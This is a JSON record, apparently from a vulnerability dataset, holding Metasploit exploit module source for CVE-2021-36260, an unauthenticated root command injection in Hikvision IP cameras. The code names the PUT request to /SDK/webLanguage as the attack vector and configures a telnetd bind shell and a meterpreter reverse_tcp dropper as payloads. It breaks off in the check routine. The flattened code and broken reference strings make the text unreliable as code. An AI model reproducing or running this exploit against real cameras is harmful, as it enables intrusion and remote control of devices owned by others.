{
    "text": "vul_name : Hikvision IP Camera Unauthenticated Command Injection ， vul_cve : CVE-2021-36260 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， prepend Msf : Exploit : Remote : AutoCheck ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : CmdStager ， include Msf : Exploit : FileDropper ， super (  ， update_info (  ， info ,  ， 'Name' => 'Hikvision IP Camera Unauthenticated Command Injection' ,  ， 'Description' => %q{ ， This module exploits an unauthenticated command injection in a variety of Hikvision IP ， cameras ( CVE-2021-36260 ) . The module inserts a command into an XML payload used with an ， HTTP PUT request sent to the `/SDK/webLanguage` endpoint , resulting in command execution ， as the `root` user. ， This module specifically attempts to exploit the blind variant of the attack. The module ， was successfully tested against an HWI-B120-D/W using firmware V5.5.101 build 200408. It ， was also tested against an unaffected DS-2CD2142FWD-I using firmware V5.5.0 build 170725. ， Please see the Hikvision advisory for a full list of affected products. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'Watchful_IP' ,  # Vulnerability discovery and disclosure ， 'bashis' ,  # Proof of concept ， 'jbaines-r7' # Metasploit module ，  ]  ,  ， ' ，  [ 'CVE' , '2021-36260' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'DisclosureDate' => '2021-09-18' ,  ， 'Platform' => [ 'unix' , 'linux' ]  ,  ， 'Arch' => [ ARCH_CMD , ARCH_ARMLE ]  ,  ， 'Privileged' => false ,  ， 'Targets' => [  ，  [  ， 'Unix Command' ,  ， { ， 'Platform' => 'unix' ,  ， 'Arch' => ARCH_CMD ,  ， 'Type' => : unix_cmd ,  ， 'DefaultOptions' => { ，  # the target has very limited payload targets and a tight payload space. ，  # bind_busybox_telnetd might be * the only * one. ， 'PAYLOAD' => 'cmd/unix/bind_busybox_telnetd' ,  ，  # saving four bytes of payload space by using 'sh' instead of '/bin/sh' ， 'LOGIN_CMD' => 'sh' ,  ， 'Space' => 23 ， } ， } ，  ]  ,  ，  [  ， 'Linux Dropper' ,  ， { ， 'Platform' => 'linux' ,  ， 'Arch' => [ ARCH_ARMLE ]  ,  ， 'Type' => : linux_dropper ,  ， 'CmdStagerFlavor' => [ 'printf' , 'echo' ]  ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'linux/armle/meterpreter/reverse_tcp' ， } ， } ，  ]  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DefaultOptions' => { ， 'RPORT' => 80 ,  ， 'SSL' => false ,  ， 'MeterpreterTryToFork' => true ， } ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ,  ， 'SideEffects' => [ IOC_IN_LOGS , ARTIFACTS_ON_DISK ]  ， } ， register_options (  [  ， OptString.new ( 'TARGETURI' ,  [ true , 'Base path' , '/' ]  )  ，  ]  )  ， end ，  # Check will test two things :  ，  # 1. Is the endpoint a Hikvision camera? ，  # 2. Does the endpoint respond as expected to exploitation? This module is ，  # specifically testing for the blind variant of this attack so we key off ，  # of the returned HTTP status code. The developer's test target responded ，  # to exploitation with a 500. Notes from bashis' exploit indicates that ，  # they saw targets respond with 200 as well , so we'll accept that also. ， def check ，  # Hikvision landing page redirects to '/doc/page/login.asp' via JavaScript :  ，  # <script> ，  # window.location.href = \"/doc/page/login.asp?_\" + ( new Date (  ) .getTime (  )  ;  ，  # </script> ， res = send_request_cgi ( { ， 'method' => 'GET' ,  ， 'uri' => normalize_uri ( target_uri.path , '/' )  ， } ) ",
    "time": "2022.03.01"
}